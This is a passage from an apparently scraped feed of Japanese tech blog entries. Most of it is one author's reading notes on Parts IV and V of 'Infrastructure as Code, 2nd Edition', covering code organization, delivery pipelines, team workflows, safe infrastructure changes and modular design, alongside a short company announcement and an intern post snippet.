speakerdeck.com技術的負債が生まれる背景を理解して，アーリーからレイター向けの根本的なアプローチを考える良い内容だったので感想書く speakerdeck.com参考資料Infrastructure as CodeInfrastructure as Code 再考Infrastructure as Codeのこれまでとこれから/Infra Study Meetup\xa0#1わたしたちにIaCはまだ早かったのかもしれないThe History of DevOps ReportsEffective DevOpsLeanとDevOpsの科学[Accelerate] テクノロジーの戦略的活用が組織変革を加速する継続的デリバリーのソフトウェア工学:もっと早く、もっと良いソフトウェアを作るための秘訣メタファーとしての発酵Hashicorp DeveloperChef InfraAnsible - Ansible is a radically simple IT automation platform that makes your applications and systems easier to deploy and maintain.aws-cdk - The AWS Cloud Development Kit is a framework for defining cloud infrastructure in codePulumi - Infrastructure as Code in any programming language.dapr - Dapr is a portable, event-driven, runtime for building distributed applications across cloud and edge.dagger - Application Delivery as Code that Runs AnywhereInfrastructure as Code, 3rd EditionPlatform Engineering MeetupBackstage - Backstage is an open platform for building developer portalsbackstage.ioWhat is platform engineering?DXを成功に導くクラウド活用推進ガイド CCoEベストプラクティスウェブオペレーション―サイト運用管理の実践テクニック","link":"https://syu-m-5151.hatenablog.com/entry/2023/11/21/132144","isoDate":"2023-11-21T04:21:44.000Z","dateMiliSeconds":1700540504000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイク、Google Cloud Japan の「Google Cloud Partner Top Engineer 2024」にて3名のエンジニアが受賞","contentSnippet":"株式会社スリーシェイクは、この度 Google Cloud Japan の「Google Cloud Partner Top Engineer 2024」において、スリーシェイクから3名のエンジニアが受賞したことをお知らせいたします。The post スリーシェイク、Google Cloud Japan の「Google Cloud Partner Top Engineer 2024」にて3名のエンジニアが受賞 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/google-cloud-partner-top-engineer-2024/","isoDate":"2023-11-20T00:50:00.000Z","dateMiliSeconds":1700441400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ChatGPTのFunctionCallをGolangで試してみる","contentSnippet":"1. はじめに はじめまして、Sreake事業部インターン生の井上です。私はSreake事業部にてSRE技術の調査と研究を行う目的で2023年3月6日から長期インターン生として参加しています。 今回、ChatGPTの新機 […]The post ChatGPTのFunctionCallをGolangで試してみる first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/chatgpt-function-call-with-golang/","isoDate":"2023-11-17T11:24:01.000Z","dateMiliSeconds":1700220241000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Infrastructure as Code, 2nd Edition のV. Delivering Infrastructure 読書感想文","contentSnippet":"はじめに前回の続きで第四部のV. Delivering Infrastructure (インフラストラクチャの提供)という部の読書感想文になります。前回の記事syu-m-5151.hatenablog.com書籍のリンクInfrastructure as Code: Dynamic Systems for the Cloud Age (English Edition)作者:Morris, KiefO\'Reilly MediaAmazon第五部 目次V. Delivering Infrastructure (インフラストラクチャの提供)18. Organizing Infrastructure Code (インフラストラクチャコードの整理)    - インフラストラクチャコードを整理し管理する方法について論じます。19. Delivering Infrastructure Code (インフラストラクチャコードのデリバリー)    - インフラストラクチャコードを効果的に提供する戦略について解説します。20. Team Workflows (チームワークフロー)    - チームがインフラストラクチャコードを管理し作業するためのワークフローについて紹介します。21. Safely Changing Infrastructure (インフラストラクチャの安全な変更)    - インフラストラクチャを安全に変更するための実践的なアドバイスを提供します。V. Delivering Infrastructure (インフラストラクチャの提供)18. Organizing Infrastructure Code (インフラストラクチャコードの整理)この章では、スタック定義、サーバー設定、モジュール、ライブラリ、テスト、設定、ユーティリティなど、さまざまな種類のコードが含まれる可能性があります。これらのコードをプロジェクト間およびリポジトリ内でどのように整理するか、またインフラストラクチャコードとアプリケーションコードを一緒に管理するべきか、分けるべきかという問題が提起されています。これには、複数部分からなるエステートのコードをどのように整理するかという課題も含まれます。Organizing Projects and Repositoriesこのセクションでは、プロジェクトがシステムの個別のコンポーネントを構築するために使用されるコードの集まりであると説明されています。プロジェクトやそのコンポーネントがどれだけ含むべきかについての硬いルールはありません。プロジェクト間の依存関係と境界は、プロジェクトコードの整理方法に明確に反映されるべきです。コンウェイの法則によれば、組織の構造とそれが構築するシステムの間には直接的な関係があります。チーム構造とシステムの所有権、およびそれらのシステムを定義するコードの不整合は、摩擦と非効率を生み出します。One Repository, or Many?複数のプロジェクトを持つ場合、それらを単一のリポジトリに入れるべきか、複数のリポジトリに分散させるべきかという問題があります。コードを同じリポジトリに保持すると、バージョン管理やブランチ化が一緒に行えるため、いくつかのプロジェクト統合およびデリバリー戦略を簡素化します。One Repository for Everythingすべてのコードを単一のリポジトリで管理する戦略は、ビルド時のプロジェクト統合パターンでうまく機能します。この戦略では、リポジトリ内のすべてのプロジェクトを一緒にビルドしますが、アプリケーションパッケージ、インフラストラクチャスタック、サーバーイメージなど、複数の成果物を生み出すことがあります。Figure 18-1. Building all projects in a repository togetherA Separate Repository for Each Project (Microrepo)各プロジェクトごとに別のリポジトリを持つ戦略は、プロジェクト間のクリーンな分離を保証します。特に、各プロジェクトを別々にビルドしてテストするパイプラインを持つ場合に効果的です。Multiple Repositories with Multiple Projects一つのリポジトリですべてを管理する極端な戦略と、各プロジェクトごとに別のリポジトリを持つ極端な戦略の間で、多くの組織は複数のリポジトリを持ち、複数のプロジェクトを含む方法を採用しています。Organizing Different Types of Code異なるタイプのコードを整理する戦略を持つことは、コードベースを維持可能にするのに役立ちます。例えば、スタックのプロジェクトレイアウトは、インフラストラクチャスタックコード、テストコード、設定ファイル、デリバリー設定などを含む可能性があります。Delivering Infrastructure and Applicationsアプリケーションとインフラストラクチャのコードを一緒に管理するか、別々にするかという選択は、組織の構造と所有権の分割に依存します。アプリケーションチームがインフラストラクチャに関する責任を持つ場合、コードを分けることは認知的な障壁を生み出す可能性があります。システムのインフラストラクチャのアーキテクチャ、品質、および管理をコードベースから導くという概念を持っています。したがって、コードベースはビジネス要件とシステムアーキテクチャに応じて構築され、管理される必要があります。それはまた、チームが効果的であるためのエンジニアリング原則と実践をサポートする必要があります。19. Delivering Infrastructure Code (インフラストラクチャコードのデリバリー)インフラストラクチャコードのデリバリーについての章では、ソフトウェアのデリバリーライフサイクルが重要なコンセプトとして強調されています。しかし、インフラストラクチャのデリバリーは、しばしば異なるタイプのプロセスに従います。例えば、本番環境でテストされないハードウェアの変更が一般的です。しかし、コードを使ってインフラストラクチャを定義することで、より包括的なプロセスで変更を管理する機会が生まれます。例えば、サーバーのRAMを変更するような手動で構築されたシステムへの変更を開発環境で複製することは、ばかげているように思えるかもしれません。しかし、コードで実装された変更は、パイプラインを通じて本番環境へ簡単に展開することができます。Delivering Infrastructure Codeパイプラインのメタファーは、インフラストラクチャコードの変更が開発者から本番インスタンスへ進む方法を説明しています。このデリバリープロセスに必要なアクティビティは、コードベースの整理方法に影響を与えます。Figure 19-1. Infrastructure code project delivery phasesBuilding an Infrastructure Projectインフラストラクチャプロジェクトのビルドは、コードを使用するための準備を行います。これには、ライブラリの取得、ビルド時の設定の解決、コードのコンパイルまたは変換、テストの実行、ツールが適用するためのフォーマットでコードを準備することなどが含まれます。Packaging Infrastructure Code as an Artifact一部のツールでは、「コードの使用準備」は特定のフォーマットのパッケージファイルにファイルを組み立てることを意味します。これは、Ruby（gems）、JavaScript（NPM）、Python（pipインストーラーを使用するPythonパッケージ）などの一般的なプログラミング言語で一般的なプロセスです。Using a Repository to Deliver Infrastructure Codeチームはソースコードリポジトリを使用して、インフラストラクチャソースコードの変更を保存し、管理します。多くのチームは、環境やインスタンスにデリバリーする準備ができたコードを保存するために、別のリポジトリを使用します。Figure 19-2. Build stage publishes code to the delivery repositoryIntegrating Projects「Organizing Projects and Repositories」で述べたように、コードベース内のプロジェクト間には通常、依存関係があります。次に、互いに依存するプロジェクトの異なるバージョンをいつ、どのように組み合わせるかという問題があります。Pattern: Build-Time Project Integrationビルド時のプロジェクト統合パターンは、複数のプロジェクトをまたいでビルドアクティビティを実行します。これには、それらの依存関係を統合し、プロジェクト間のコードバージョンを設定することが含まれます。Pattern: Delivery-Time Project Integrationデリバリー時のプロジェクト統合パターンは、それぞれのプロジェクトを個別にビルドおよびテストした後で組み合わせます。このアプローチでは、ビルド時の統合よりも後の段階でコードのバージョンを統合します。Pattern: Apply-Time Project Integration適用時のプロジェクト統合は、複数のプロジェクトを別々にデリバリーステージを進めることを含みます。プロジェクトのコードに変更が加えられたとき、パイプラインはそのプロジェクトの更新されたコードをそのプロジェクトのデリバリーパスの各環境に適用します。Using Scripts to Wrap Infrastructure Tools多くのチームは、インフラストラクチャツールをオーケストレーションし、実行するためにカスタムスクリプトを作成します。これには、Make、Rake、Gradleなどのソフトウェアビルドツールを使用する場合や、Bash、Python、PowerShellでスクリプトを書く場合があります。多くの場合、このサポートコードはインフラストラクチャを定義するコードと同じくらい、またはそれ以上に複雑になり、チームはそのデバッグと維持に多くの時間を費やすことになります。確実で信頼性の高いインフラストラクチャコードのデリバリープロセスを作成することは、4つの主要なメトリクスに対して良好なパフォーマンスを達成するための鍵です。あなたのデリバリーシステムは、システムへの変更を迅速かつ信頼性高くデリバリーすることの実際の実装です。Only build packages once. を参考にしてください。20. Team Workflows (チームワークフロー)IaCを利用することによる作業方法の根本的な変化に焦点を当てています。従来のアプローチとは異なり、仮想サーバーやネットワーク構成の変更をコマンド入力やライブ設定の直接編集ではなく、コードの記述と自動化システムによる適用を通じて行います。これは新しいツールやスキルの習得を超えた変化であり、インフラストラクチャを設計、構築、管理する全ての人々の働き方に影響を与えます。Figure 20-1. A classic mapping of a dedicated team to each part of a workflowThe People信頼できる自動化ITシステムでは、人々が重要な役割を果たします。コード変更を本番システムに反映させるためには、テスト結果のレビューやボタンの操作以外に、人の手は必要ありませんが、システムの継続的な構築、修正、適応、改善には人間が不可欠です。Who Writes Infrastructure Code?組織によってインフラストラクチャコードを誰が書くかという問いに対する答えは異なります。伝統的なプロセスとチーム構造を維持しようとする組織では、インフラストラクチャを構築（およびサポート）するチームがインフラストラクチャ・アズ・コードのツールを使用して作業を最適化します。また、多くの組織ではアプリケーションチームが自分たちのアプリケーションに必要なインフラストラクチャを定義しています。Applying Code to Infrastructureインフラストラクチャへのコード適用に関する一般的なワークフローは、共有ソースリポジトリ内のコードから始まります。チームメンバーは最新バージョンのコードを自分の作業環境にプルし、編集した後、ソースリポジトリにプッシュして新しいバージョンのコードを様々な環境に適用します。Applying Code from Your Local Workstationローカルワークステーションからインフラストラクチャコードを適用することは、他の誰も使用していないインフラストラクチャのテストインスタンスに対しては有用です。しかし、ローカル作業環境からツールを実行すると、共有インフラストラクチャインスタンスに問題を引き起こす可能性があります。Applying Code from a Centralized Serviceインフラストラクチャコードをインスタンスに適用するために、中央集権的なサービスを使用できます。このサービスはソースコードリポジトリまたはアーティファクトリポジトリからコードをプルし、インフラストラクチャに適用します。Personal Infrastructure Instances理想的には、共有リポジトリにプッシュする前にコード変更をテストできる方法があります。これにより、変更が期待通りの動作をするかどうかを確認でき、パイプラインがオンラインテストステージまでコードを実行するのを待つよりも高速です。Source Code Branches in Workflowsソースリポジトリのブランチは、コードベースの異なるコピー（ブランチ）で作業を行い、準備ができたら統合する際に役立ちます。Martin Fowlerの記事「Patterns for Managing Source Code Branches」には、チームのワークフローの一部としてブランチを使用する様々な戦略やパターンが説明されています。Preventing Configuration Drift設定のドリフトを防ぐために、ワークフローにおいていくつかの対策を講じることができます。これには、自動化の遅れを最小限に抑える、アドホックな適用を避ける、コードを継続的に適用する、不変のインフラストラクチャを使用するなどが含まれます。Governance in a Pipeline-based Workflowパイプラインベースのワークフローにおけるガバナンスでは、責任の再配置、左へのシフト、インフラストラクチャ・アズ・コードのガバナンスを持つ例示プロセスなどが議論されます。インフラストラクチャをコードとして定義する組織では、人々は日々のルーチン活動やゲートキーパーとしての作業に費やす時間が減り、システム自体の改善能力を向上させるためにより多くの時間を費やすことになるはずです。彼らの努力は、ソフトウェアのデプロイおよび運用パフォーマンスの4つの指標に反映されます。21. Safely Changing Infrastructure (インフラストラクチャの安全な変更)Chapter 21: Safely Changing Infrastructure21. Safely Changing Infrastructure本章では、インフラの迅速かつ頻繁な変更の重要性に焦点を当てています。私のSREとしての経験では、速さと安定性は相補的な要素であることが多くのプロジェクトで証明されています。特に、インフラストラクチャー・アズ・コード(IaC)の実践において、このアプローチは効率と品質を大幅に向上させることができます。変更の頻度を上げることで、小さな問題を迅速に検出し、修正することが可能になります。Reduce the Scope of Change小さな変更の範囲を制限することは、リスクの軽減に寄与します。私の経験からも、小さな変更ほど管理が容易であり、予期せぬ問題への対応も迅速になるということが証明されています。このアプローチは、大規模な変更を小分けにして取り組むことで、変更の複雑性とリスクを管理するのに有効です。Figure 21-2. Plan to split out multiple stacksSmall Changes小さな変更を積極的に行うことの利点は、私のプロジェクト経験で明らかです。バッチサイズを小さくすることで、リスクを最小限に抑え、より迅速なフィードバックを得ることが可能になります。これは特に複雑なシステムにおいて、問題の特定と修正を容易にします。小さな変更は、大きなリリースの複雑さを減らし、より継続的なデリバリーを可能にします。Example of Refactoringリファクタリングの例は、コードベースを改善し、将来の変更を容易にするための重要な手段です。実際、私の経験では、リファクタリングはしばしば次のステップへの道を開くための重要なプロセスであり、これによりコードの保守性と拡張性が向上します。リファクタリングは、既存の機能を維持しつつ、コードの構造を改善することで、新しい機能の追加や将来的な変更を容易にします。Pushing Incomplete Changes to Production不完全な変更を本番環境に押し出すことは、段階的なデプロイメントの一環として重要です。この戦略は、変更の影響を小さく保ちながらも、継続的な進化を促進します。特に、リリース前のテスト段階でのフィードバックを得るために役立ちます。Parallel Instances並行インスタンスの概念は、本番環境でのリスクを軽減する上で非常に効果的です。これにより、新しい変更を既存のシステムと並行してテストし、徐々に本番環境に移行することが可能になります。これは、特に大規模なシステムや重要な機能の更新において、ダウンタイムを避けるための重要な戦略です。Backward Compatible Transformations後方互換性を持つ変更は、サービスの中断を防ぎつつ進化を遂げるための鍵です。このアプローチにより、既存の機能を維持しつつ、新しい機能や改善を段階的に導入することができます。これは、システムの安定性を保ちながらも、進歩と成長を促すために非常に効果的です。Feature Toggles機能トグルは、新旧の機能を柔軟に管理できる強力なツールです。これにより、新しい機能を段階的に導入し、必要に応じて迅速に変更を反映することができます。段階的なデプロイメントやA/Bテストにおいてこの技術は特に有効で、リスクを最小限に抑えつつ、ユーザーの反応を評価することができます。Changing Live Infrastructureライブインフラの変更は、サービスの中断を最小限に抑えながらインフラを最新の状態に保つために不可欠です。このセクションでは、インフラストラクチャーの更新がサービスの連続性に与える影響を最小限に抑えるための技術と戦略が紹介されています。Infrastructure Surgeryインフラの手術は、既存のインフラを修正しつつサービスを維持するための洗練された方法です。これにより、サービスの中断を最小限に抑えながら、重要なインフラの変更や改善を行うことができます。このアプローチは、特にデータ損失のリスクを最小限に抑えたい場合や、既存のシステムを段階的に改善したい場合に有効です。Expand and Contract拡張と収縮のパターンは、インフラの柔軟性を最大限に活用する素晴らしい方法です。このアプローチは、リソースの効率的な利用とスケーラビリティの向上に寄与します。特にクラウド環境において、この手法を利用することで、リソースの迅速な拡張と収縮が可能になり、需要の変動に応じたスケーリングが実現できます。Zero Downtime Changesダウンタイムのない変更は、ユーザーエクスペリエンスを維持しつつ、システムのアップデートを行う上で非常に重要です。これにより、サービスの中断を防ぎつつ、新しい機能や修正を順次適用することができます。この手法は、特にユーザーへの影響を最小限に抑えたい場合に有効です。Continuity継続性は、変更管理における中心的な考え方です。エラーを防ぐことによる継続性、速やかな回復による継続性、継続的な災害復旧、カオスエンジニアリング、そして失敗計画は、システムの安定性と耐久性を確保するために重要な要素です。これらのアプローチは、リスクを軽減し、システムの回復力を高めるのに役立ちます。Continuity by Preventing Errorsエラーを予防することによる継続性は、事前の計画と迅速な回復のバランスを取ることが重要です。このアプローチにより、システムの安定性を維持しながら、予期せぬ問題に迅速に対応することが可能になります。エラーの予防と迅速な修正は、特に大規模なシステムにおいて、サービスの連続性と信頼性を確保するために不可欠です。Continuity by Fast Recovery速やかな回復による継続性は、現代のインフラにおいて不可欠な要素です。システムの迅速な回復は、特に予期せぬ障害やエラーが発生した場合に、サービスの中断を最小限に抑えるために重要です。これは、特にビジネスクリティカルなアプリケーションやサービスにおいて、信頼性と利用可能性を確保するための鍵となります。Continuous Disaster Recovery継続的な災害復旧は、システムの耐障害性を高め、ビジネスの継続性を保証するために不可欠です。このアプローチは、システムの変更に関連するリスクを管理し、不測の事態が発生した場合に迅速に対応できるようにすることが重要です。私の経験では、継続的な災害復旧の計画と実施は、組織の全体的なリスク管理戦略の核心部分を形成します。これにより、システムが予期せぬ障害にも迅速に対応し、サービスの継続性を維持できるようになります。システムのバックアップと復旧プロセスを定期的にテストし、改善することで、災害発生時のリカバリー時間を短縮し、ビジネスへの影響を最小限に抑えることが可能です。Chaos Engineeringカオスエンジニアリングは、システムの弱点を明らかにし、それらを改善するための実践的なアプローチです。この手法は、システムの耐障害性を試験し、実際の環境での挙動を理解するのに非常に有効です。私のキャリアの中で、カオスエンジニアリングはシステムの弱点を早期に特定し、それに対処する機会を提供する重要なツールとなっています。意図的に障害を引き起こすことで、システムの回復力をテストし、実際の災害時に備えることができます。このようなプラクティスにより、システムの安定性と信頼性が向上し、ユーザー体験の質が保たれます。Planning for Failure失敗計画は、システムの回復力を高めるために重要です。失敗を計画することは、システムの弱点を特定し、それらに対応するための戦略を立てることを意味します。私が経験したプロジェクトでは、様々な失敗シナリオを想定し、それぞれに対する回復計画を策定することが、システムの全体的な堅牢性を高める上で非常に重要でした。失敗計画は、リスクの評価と緩和策の策定を通じて、システムの安全性と効率性を保証します。また、失敗に迅速かつ効果的に対応するための準備とプロセスを確立することで、ビジネスの中断を最小限に抑えることができます。Data Continuity in a Changing Systemデータの連続性は、変更のあるシステムにおいて最も重要な側面の一つです。私の経験では、データの安全性と一貫性を維持することは、サービスの品質と顧客信頼の基盤となります。Lockロック機能は、特定のリソースを変更から保護する効果的な方法です。しかし、自動化と手動の介入のバランスを見極めることが重要です。過度に手動の介入に依存することはリスクを高める可能性があります。Segregateデータを他のシステムコンポーネントから分離することにより、より柔軟かつ安全に変更を行うことが可能になります。このアプローチは、データを中心としたアーキテクチャ設計において特に有効です。Replicateデータの複製は、可用性と耐障害性の向上に寄与します。分散型データベースのようなシステムでは、データの複製が自動化されることが多く、このプロセスはデータの保護に不可欠です。Reloadデータの再ロードやバックアップは、データ損失を防ぐ上で基本的です。バックアップと復元のプロセスを自動化することで、データの信頼性とアクセス性が大幅に向上します。Mixing Data Continuity Approachesデータの継続性を確保する最善の方法は、分離、複製、再ロードの組み合わせです。この複合的なアプローチにより、データの安全性とアクセス性の両方を最大化できます。データの継続性は、単一の手法に依存するのではなく、複数の手法をバランスよく組み合わせることで、最も効果的に実現されます。この章の締めくくりでは、インフラ変更におけるデータの継続性の重要性が強調されています。クラウド時代におけるインフラ管理の進化に伴い、速度と品質のバランスを取りながらも、データの安全性を維持することの重要性が明確にされています。データはビジネスの中心にあり、その連続性と安全性を確保することが、サービスの品質と顧客信頼を維持するための鍵であることが再確認されます。総括 Infrastructure as Code, 2nd Edition の読書感想文『Infrastructure as Code, 2nd Edition』は、現代のITインフラストラクチャ管理の進化に対応するための重要なガイドです。この書籍は、インフラストラクチャをコードとして扱うことの重要性と、それを実現するための具体的な方法を体系的に説明しています。第一部では、インフラストラクチャをコードとして管理する基本原則に焦点を当て、クラウド時代のダイナミクスを解説しています。特に、変更の速度を利用してリスクを減らし、品質を向上させる新しいマインドセットの必要性が強調されています。第二部では、インフラストラクチャスタックの構築と管理に関して詳述し、スタックの構築、環境の設定、および継続的なテストと提供の重要性について論じています。ここでは、インフラストラクチャの自動化におけるスタックの重要性を明確にし、技術的な洞察と実践的な指針を提供します。第三部は、サーバーと他のアプリケーションランタイムプラットフォームとの作業に注目し、アプリケーションランタイム、サーバーのコード化、サーバーへの変更管理などを取り上げています。この部分は、アプリケーション主導のインフラストラクチャ戦略を通じて、現代の動的インフラを使用してアプリケーションランタイム環境を構築する方法に重点を置いています。第四部では、インフラストラクチャの設計に関して、小さく単純な部品の使用、モジュラリティ、コンポーネント設計のルール、モジュール化、およびスタックコンポーネントの設計パターンとアンチパターンについて論じています。このセクションは、効率的で持続可能なインフラストラクチャを設計するための具体的な方法とベストプラクティスを提供します。第五部では、インフラストラクチャコードの整理、提供、チームワークフロー、およびインフラストラクチャの安全な変更に焦点を当てています。インフラストラクチャコードの整理と管理、デリバリープロセス、プロジェクトの統合、および安全な変更の方法に関する洞察が提供されています。全体として、この書籍は、インフラストラクチャとしてのコードの採用と適用において、技術者や専門家に重要な洞察と価値ある情報を提供し、インフラストラクチャ管理の現代的なアプローチを実現するための実践的なガイドとなっています。その詳細な解説と実用的なアドバイスは、この分野で働く専門家にとって非常に役立つものです。Infrastructure as Code, 2nd Editionの読書感想文Infrastructure as Code, 2nd Edition の I. Foundations 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のII. Working With Infrastructure Stacks 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition の III. Working With Servers And Other Application Runtime Platforms 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のIV. Designing Infrastructure 読書感想文 - じゃあ、おうちで学べるInfrastructure as Code, 2nd Edition のV. Delivering Infrastructure 読書感想文 - じゃあ、おうちで学べる","link":"https://syu-m-5151.hatenablog.com/entry/2023/11/16/161320","isoDate":"2023-11-16T07:13:20.000Z","dateMiliSeconds":1700118800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Infrastructure as Code, 2nd Edition のIV. Designing Infrastructure 読書感想文","contentSnippet":"はじめに前回の続きで第四部のIV. Designing Infrastructure (インフラストラクチャの設計)という部の読書感想文になります。前回の記事syu-m-5151.hatenablog.com次回の記事* Infrastructure as Code, 2nd Edition のV. Delivering Infrastructure 読書感想文 - じゃあ、おうちで学べる書籍のリンクInfrastructure as Code: Dynamic Systems for the Cloud Age (English Edition)作者:Morris, KiefO\'Reilly MediaAmazon第四部 目次IV. Designing Infrastructure (インフラストラクチャの設計)15. Core Practice: Small, Simple Pieces (コアプラクティス：小さく、単純な部品)    - 小さく単純な部品を使用してインフラストラクチャを設計する方法に焦点を当てます。16. Building Stacks From Components (コンポーネントからスタックを構築する)    - 個々のコンポーネントから効果的なスタックを構築するアプローチを提供します。17. Using Stacks As Components (スタックをコンポーネントとして使用する)    - スタックをコンポーネントとして活用するための戦略について説明します。IV. Designing Infrastructure (インフラストラクチャの設計)15. Core Practice: Small, Simple Pieces (コアプラクティス：小さく、単純な部品)Designing for Modularityモジュラリティの設計は、システムの変更を安全かつ容易にすることを目的としています。これは、ソフトウェア開発経験においても非常に重要です。モジュール式の設計は変更管理を簡素化し、技術的負債の蓄積を防ぐ効果があります。インフラコードにおいても、このアプローチは同様に有効であり、システムの成長に伴う複雑さとリスクを管理するための鍵となります。コンポーネントをより小さく、単純に保つことで、システム全体の品質と反応性が向上します。Characteristics of Well-Designed Components良く設計されたコンポーネントは、低い結合度と高い凝集度を持ちます。これは、各コンポーネントが独立して機能し、他の部分に影響を及ぼすことなく変更可能であることを意味します。これらの特徴はシステムの長期的な安定性とメンテナンスの容易さに大きく貢献します。低結合度は、一部の変更が全体のシステムに広範な影響を与えるリスクを最小限に抑え、高凝集度は、コンポーネントがその機能に集中し、より効率的に動作することを可能にします。Rules for Designing Componentsコンポーネントの設計におけるルールには、重複の排除や単一責任原則などが含まれます。これらはコードの可読性と保守性を高め、変更を容易にします。重複の排除は、同じ機能やデータの複数のコピーを避けることで、変更時の労力を減らし、エラーの可能性を下げます。一方、単一責任原則は、各コンポーネントが一つの機能または責任を持つべきであるという原則です。これにより、システムはより整理され、理解しやすくなります。Use Testing to Drive Design Decisionsテスト駆動設計は、インフラコードの品質を向上させます。テストは、コードの継続的な改善を促進し、設計の効率化に寄与します。テスト可能なコードは、自然とより良い設計に導かれます。テストを重視することで、コードの変更が容易になり、新しい機能の追加や既存機能の改善がスムーズに行えるようになります。また、自動化されたテストは、システムの信頼性を確保し、デプロイメントプロセスを加速します。Modularizing Infrastructureインフラのモジュラー化は、システムの柔軟性とスケールアップを促進します。構成要素を効果的に分割することで、変更が容易になり、システムの拡張がスムーズに行えます。このアプローチは、インフラストラクチャの管理と運用においても有効であり、特に大規模なシステムでは、異なる部分を個別に更新、拡張、または縮小できる柔軟性が重要です。モジュール化されたインフラストラクチャは、変更のスピードを高め、システムの全体的な効率を改善します。Stack Components Versus Stacks as Componentsスタックコンポーネントとしてのスタックは、独立性を提供し、変更を容易にします。分離されたスタックは変更管理とスケーラビリティにおいて重要な役割を果たします。スタックとしてのコンポーネントは、システムの一部として独立してデプロイおよび管理することができ、これにより大規模な変更や障害が他の部分に波及するリスクを最小限に抑えます。Figure 15-1. Shared code module used by two stacks より引用Using a Server in a Stackスタック内でサーバーを使用することは、設定変更の容易さを提供します。これにより、運用上の柔軟性が高まります。サーバーをスタックの一部として扱うことで、サーバーの設定やソフトウェアの更新が簡単になり、システム全体のメンテナンスが容易になります。また、サーバーの迅速な追加や削除が可能となり、システムのスケーラビリティが向上します。Drawing Boundaries Between Componentsコンポーネント間の境界を適切に設定することは、システムの成長と変更を管理する上で重要です。これはシステムの安定性と拡張性を支えます。境界線を引くことで、システムの異なる部分を明確に区分し、それぞれが独立して機能し、互いに干渉しないようにします。これにより、システムの一部を変更しても、他の部分に予期しない影響を与えるリスクが減少します。Align Boundaries with Natural Change Patterns変更パターンに合わせた境界線は、システムの自然な進化を促進します。これにより、継続的な改善が可能になります。システムの異なる部分がどのように変化し、成長するかを理解することで、それらの部分を適切に区分することができます。これは、変更の管理を容易にし、システム全体の効率を高めます。Align Boundaries with Component Life Cyclesコンポーネントのライフサイクルに合わせた境界線は、管理の簡素化をもたらします。特定のコンポーネントの更新や交換が容易になります。例えば、頻繁に更新が必要なコンポーネントと、長期間安定して運用されるコンポーネントを区別することで、各コンポーネントをより効果的に管理することが可能になります。Align Boundaries with Organizational Structures組織構造に合わせた境界線の設定は、チーム間のコラボレーションを促進し、システムの全体的な一貫性を向上させます。Conwayの法則によれば、システムの設計はしばしばその開発を行う組織の構造を反映します。例えば、開発と運用が別々のチームによって行われる場合、それぞれのチームはシステムの異なる部分を管理することになり、結果としてシステム全体が分断されがちです。これを避けるためには、チームの組織構造をシステムのアーキテクチャに合わせて調整することが有効です。これにより、各チームは自分たちの責任範囲内で効率的に作業を進めることができ、全体としてのシステムの一貫性と効率が向上します。Create Boundaries That Support Resilience回復力を支持する境界線の設定は、システムの耐障害性と回復力を強化します。これは、特定のコンポーネントやサービスが障害に遭遇した場合に、システム全体が影響を受けるリスクを最小限に抑えることを意味します。例えば、システムの一部が故障した場合に、他の部分が正常に機能し続けるように設計することです。これにより、障害発生時にもシステムの主要な機能が維持され、迅速な回復が可能になります。また、このような設計は、障害発生時の影響範囲（ブラストラジアス）を小さくすることも目的としています。Create Boundaries That Support Scalingスケーリングを支持する境界線の設定は、システムの拡張性を高めることを目指します。これにより、需要の増大や減少に応じてシステムのリソースを柔軟に調整することが可能になります。例えば、特定のサービスやコンポーネントの利用が増加した場合に、追加のリソースを割り当てることで対応することができます。また、リソースの利用が減少した場合には、不要なリソースを削減してコストを節約することも可能です。このように、スケーリングを支持する境界線を設定することで、システムは変動する需要に柔軟に対応し、最適なパフォーマンスを維持することができます。Align Boundaries to Security and Governance Concernsセキュリティとガバナンスの懸念に合わせて境界線を設定することは、システムのセキュリティを強化し、規制遵守を容易にします。これは、異なるセキュリティ要件を持つシステムの部分に対して適切な保護措置を施すことを意味します。例えば、金融情報や個人データを扱う部分には、より厳格なセキュリティ対策が必要です。セキュリティとガバナンスに基づいて境界線を設定することにより、これらの要件を満たすための管理が容易になり、システム全体のセキュリティが向上します。この章は、インフラストラクチャをコードとして定義する際の、より小さな部分への分割の重要性を強調しています。分割されたコンポーネントは、変更、スケーリング、回復力の向上に寄与し、システム全体の運用効率を高めます。また、組織構造、セキュリティ、ガバナンスの観点から適切に境界線を設定することで、システムはより安全で管理しやすい状態になります。16. Building Stacks From Components (コンポーネントからスタックを構築する)Infrastructure Languages for Stack Componentsインフラストラクチャ言語の選択は、スタックコンポーネントの設計と実装において非常に重要です。宣言型言語は、その明確な構造と予測可能性により、特に大規模なシステムの設計において有効です。一方、命令型言語は、より動的で柔軟なシステムの構築に適しています。個人的な感覚では宣言型言語はインフラストラクチャの基本的な構造を定義するのに適しており、命令型言語はより複雑なロジックや条件分岐が必要な場面で役立ちます。Reuse Declarative Code with Modules宣言型コードのモジュール化による再利用は、システムの整合性を高め、変更の管理を容易にします。私は、モジュールを利用して共通の機能を効率的に管理し、コードベースの複雑さを減らすことができると感じています。宣言型言語で書かれたモジュールは、その明確さと一貫性により、特に大規模なプロジェクトや多くの開発者が関与する環境において有効です。Dynamically Create Stack Elements with Librariesライブラリを利用した動的なスタック要素の作成は、システムの設計における柔軟性を大幅に向上させます。命令型言語を用いることで、条件に応じたリソースの動的な生成や複雑なロジックの実装が可能になり、システムのカスタマイズが容易になります。これは、特に要件が頻繁に変更されるプロジェクトや、特定の条件に基づいて異なる動作をさせる必要があるシステムにおいて有用です。Patterns for Stack Componentsスタックコンポーネントを設計する際には、適切なパターンの選択が重要です。これにより、システムの一貫性、再利用性、そして将来の拡張性が向上します。良い設計パターンを採用することで、システム全体の品質を高めることができます。Pattern: Facade Moduleファサードモジュールは、複雑なリソースをよりシンプルに扱えるようにすることで、開発者の負担を軽減します。これは、複数のプロジェクトやチーム間で共通のリソースや設定を共有する際に特に有効で、一貫性のあるアプローチを提供します。ファサードモジュールを使用することで、開発者はより高度なタスクに集中でき、基盤となる複雑な詳細について心配する必要がなくなります。Antipattern: Obfuscation 